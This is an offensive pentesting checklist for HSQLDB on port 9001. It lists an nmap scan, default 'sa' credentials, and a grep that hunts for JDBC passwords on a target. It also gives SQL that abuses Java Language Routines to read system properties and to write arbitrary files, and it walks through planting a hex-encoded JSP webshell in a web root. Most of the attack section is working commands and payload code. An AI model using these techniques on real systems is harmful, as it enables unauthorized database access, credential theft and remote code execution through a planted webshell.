# HSQLDB (Port 9001) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating HSQLDB (port 9001), I realistically expect to find:

- [ ] Default or weak credentials (often `sa` with no password)
- [ ] Access to in-memory or disk-based databases
- [ ] Ability to read Java system properties
- [ ] Possibility to write files via Java Language Routines
- [ ] Rare but critical RCE via abuse of Java methods

---

## ‚úÖ HSQLDB Pentest Checklist

- [ ] **Port Discovery**
  - Check if port 9001 is open and discover service.
    ```
    nmap -sV -p9001 <IP>
    ```

- [ ] **Identify Default Credentials**
  - Try common default combo:
    ```
    Username: sa
    Password: (blank)
    ```

- [ ] **Hunt for Creds on Target**
  - Search local filesystems for JDBC connection strings.
    ```
    grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
    ```

- [ ] **Connection**
  - Download HSQLDB and use the GUI client:
    ```
    java -jar hsqldb.jar
    ```
  - Example JDBC connection string:
    ```
    jdbc:hsqldb:hsql://<IP>/DBNAME
    ```

- [ ] **Check Java System Properties**
  - Create function to read system properties:
    ```sql
    CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR
    LANGUAGE JAVA
    DETERMINISTIC NO SQL
    EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';
    ```
  - Execute:
    ```sql
    VALUES(getsystemproperty('user.name'));
    ```
  - Common system property keys:
    - `os.name`
    - `os.version`
    - `user.name`
    - `user.home`

- [ ] **Write Arbitrary Files**
  - Create procedure to write to disk:
    ```sql
    CREATE PROCEDURE writetofile(
      IN paramString VARCHAR,
      IN paramArrayOfByte VARBINARY(1024))
    LANGUAGE JAVA
    DETERMINISTIC NO SQL
    EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
    ```
  - Execute (example for JSP webshell):
    ```sql
    CALL writetofile('/path/to/webroot/shell.jsp',
      CAST ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a...' AS VARBINARY(1024)));
    ```

---

## ‚úÖ Example Exploit Scenarios

- **Reading system info**
```
VALUES(getsystemproperty('os.name'));
VALUES(getsystemproperty('user.home'));
```


- **Writing a Webshell**
- Encode JSP content to hex
- Cast to VARBINARY and write:
  ```
  CALL writetofile('/var/www/html/shell.jsp', CAST ('<hex_payload>' AS VARBINARY(1024)));
  ```

---

## ‚úÖ Notes & Tips

- By default, HSQLDB often listens only on localhost.
- Common exploitation context is *post-initial access* (privilege escalation).
- Java Language Routines require methods/classes to be in the target‚Äôs classpath.
- File write payload limited to 1024 bytes at a time.
- Explore chained writes or uploading larger payloads in parts if possible.

---

## ‚úÖ Resources

- [HSQLDB Official Site](http://hsqldb.org/)
- [Java System Properties Reference](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html)


